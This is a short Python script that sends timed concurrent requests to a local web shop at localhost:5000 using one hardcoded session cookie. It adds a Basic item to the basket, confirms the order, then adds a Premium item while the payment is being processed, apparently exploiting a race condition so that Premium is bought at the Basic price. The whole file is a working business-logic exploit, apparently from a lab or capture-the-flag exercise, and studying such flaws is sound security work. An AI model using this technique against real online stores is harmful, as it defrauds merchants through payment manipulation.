import asyncio
import httpx

# Common headers
headers_common = {
    'Host': 'localhost:5000',
    'Connection': 'keep-alive',
    'Cookie': 'session=.eJwljkGKAzEMBP_i8x4kW7JH-cxgy2oSFnZhJjmF_D0OOVY3dNcz7TjivKbL_XjET9pvM10S2sAEwTQLQgXsQxlafHrUTXQQoBHiaj6La8-NuCgN0Tmzb1K5RuiELdLqTSSoMyxz_4yBKxNKWO08ZFjxMGtTVlUreVoijzOOrw0v9PPAfv__jb9PALbYopkaUWzIwhkN3LsHT4tMdax3Tq832HpA_Q.Z_1EWA.szlL7kHRG1bkZLLsiLegzoh8jLQ'}

# Add Basic to basket
url1 = 'http://localhost:5000/add_to_basket?q=Basic'

# Make Payment
url2 = 'http://localhost:5000/confirm_order'

# Add Premium to basket
url3 = 'http://localhost:5000/add_to_basket?q=Premium'

# Async function to send a GET request
async def send_request(url, headers):
    async with httpx.AsyncClient(timeout=30.0) as client:
        response = await client.get(url, headers=headers)
        return f"URL: {url}, Status Code: {response.status_code}, Response: {response.text}"

# Main async function
async def main():
    task1 = asyncio.create_task(send_request(url1, headers_common))
    await asyncio.sleep(1)
    task2 = asyncio.create_task(send_request(url2, headers_common))
    await asyncio.sleep(1)
    task3 = asyncio.create_task(send_request(url3, headers_common))
    result1, result2, result3 = await asyncio.gather(task1, task2, task3)

    print(result2)

if __name__ == '__main__':
    asyncio.run(main())